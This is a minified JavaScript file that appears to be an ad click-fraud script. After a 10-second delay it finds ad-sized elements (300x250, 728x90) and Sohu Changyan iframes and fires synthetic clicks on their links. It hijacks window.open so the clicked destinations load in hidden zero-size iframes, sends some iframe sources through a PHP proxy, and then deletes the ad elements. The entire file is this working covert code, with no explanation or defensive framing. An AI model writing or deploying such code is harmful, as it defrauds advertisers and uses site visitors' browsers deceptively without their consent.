!function(){window.$||(window.$=window.jQuery);var t=function(t,n){var e=document.createEvent("HTMLEvents");e.initEvent(n,!0,!0),t.dispatchEvent(e),$(t).trigger(n)},n=function(t){return!(!t||0!==t.indexOf("http"))},e={},i={},r=function(t,n,e){var i=$("html");return e&&(i=$(e).contents()),i.find("a#res0,img,iframe,embed,object").filter(function(e,i){var r=$(i);return r.width()==t&&r.height()==n})},o=function(t,n,e,i){var r=$("html");return i&&(r=$(i).contents()),r.find("iframe").filter(function(i,r){var o=$(r),a=$(r).attr("src");return!(!a||(a=a.replace(/^(http|https)\:\/\//gi,""),0!==a.indexOf(t)||o.width()!=n||o.height()!=e))})},a=function(t,n,r){void 0!=n&&void 0!=r||(n=i.width,r=i.height);var o=$("<iframe height=0 width=0 />");$("body").append(o),o.on("load",function(t){if($(this).remove(),$(".iframe-ads-"+n+"-"+r).remove(),e[n+"*"+r]){for(var i=e[n+"*"+r],o=0;o<i.length;o++)"BODY"===i[o].parent().tagName?i[o].remove():i[o].parent().remove();e[n+"*"+r]=[]}}),o.get(0).src=t},h=function(t,n,e){var i=$('<iframe class="iframe-ads-'+n+"-"+e+'" height=0 width=0 />');$("body").append(i),i.on("load",function(t){d(n,e,this)}),i.get(0).src="/PHPProxy/phpproxy.php?url="+encodeURIComponent(t)},c=function(r,o,c){var f=$(r);if("IFRAME"===f.get(0).tagName){var u=f.attr("src");u&&0===u.indexOf("http")?(h(u,o,c),e[o+"*"+c]?e[o+"*"+c].push(f):e[o+"*"+c]=[f]):d(o,c,f.get(0))}else{var p=null;if("A"===f.get(0).tagName&&(p=f),p||(p=f.siblings("a")),0===p.length&&(p=f.parents("a")),0===p.length&&(p=f.prev()),i={width:o,height:c},n(p.attr("href")))a(p.attr("href"),o,c);else{var v=window.open;window.open=a,t(p.get(0),"click"),window.open=v}e[o+"*"+c]?e[o+"*"+c].push(p):e[o+"*"+c]=[p]}},d=function(t,n,e){var i=null;e&&e.contentWindow&&(i=e.contentWindow.open,e.contentWindow.open=a);var o=r(t,n,e);return o.length<1?!1:(o.each(function(e,i){c(i,t,n)}),e&&e.contentWindow&&(e.contentWindow.open=i),!0)},f=function(t,n,i,r,a,c){var d=o(t,n,i,c);return d.length<1?!1:(d.each(function(t,n){var i=$(n),o=i.attr("src");h(o,r,a),e[r+"*"+a]?e[r+"*"+a].push(i):e[r+"*"+a]=[i]}),!0)};setTimeout(function(){d(300,250),d(728,90),f("changyan.sohu.com",650,90,728,90)},1e4)}();